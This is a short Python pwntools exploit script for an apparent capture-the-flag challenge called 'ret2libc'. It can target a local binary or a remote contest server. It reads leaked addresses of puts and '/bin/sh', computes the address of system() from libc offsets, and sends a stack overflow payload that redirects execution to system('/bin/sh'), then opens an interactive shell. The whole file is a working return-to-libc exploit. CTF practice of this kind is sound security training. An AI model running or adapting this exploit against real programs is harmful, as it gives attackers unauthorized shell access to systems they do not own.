#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context(arch='i386', os='linux')
context.log_level = 'debug'

fn = './ret2libc'
elf = ELF(fn)

if len(sys.argv) == 1:
    io = process(fn)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    io = remote('bamboofox.cs.nctu.edu.tw', 11002)
    libc = ELF('./libc.so.6')

io.recvuntil('is ')
binsh_addr = int(io.recvuntil('\n', drop=True), 16)
io.recvuntil('is ')
puts_addr = int(io.recvuntil('\n', drop=True), 16)

log.info('binsh_addr = %s', hex(binsh_addr))
log.info('puts_addr = %s', hex(puts_addr))

system_addr = libc.symbols['system'] - libc.symbols['puts'] + puts_addr

log.info('system_addr = %s', hex(system_addr))

payload = ''.join([
    'a' * (0x14 + 12),
    p32(system_addr),
    p32(0xdeadbeef),
    p32(binsh_addr),
])

io.sendline(payload)

sleep(1)
io.interactive()
